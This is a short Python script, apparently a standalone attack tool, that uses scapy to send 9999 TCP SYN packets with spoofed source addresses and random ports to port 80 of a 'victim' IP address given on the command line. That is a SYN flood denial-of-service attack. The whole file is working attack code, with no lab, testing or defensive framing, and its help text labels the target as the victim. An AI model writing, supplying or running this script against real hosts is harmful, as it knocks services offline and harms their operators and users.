from scapy.all import *

import argparse

def SYN_flood(target = None):
    assert(target != None)
    for i in range(0,9999):
        sourceIPs = '10.' + '200.' + '101.' + str(random.randrange(0,255))
        randomPorts = random.randrange(49512,65535)
        ip = IP(src = sourceIPs, dst=target)
        tcp = TCP(sport = randomPorts, dport=80, flags='S', seq=11111)
        synpacket = (ip / tcp)
        send(synpacket)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', '-t', required = True, help = 'Victim ip address')
    args = parser.parse_args()
    print('The victim IP: %s' % args.target)

    SYN_flood(args.target)
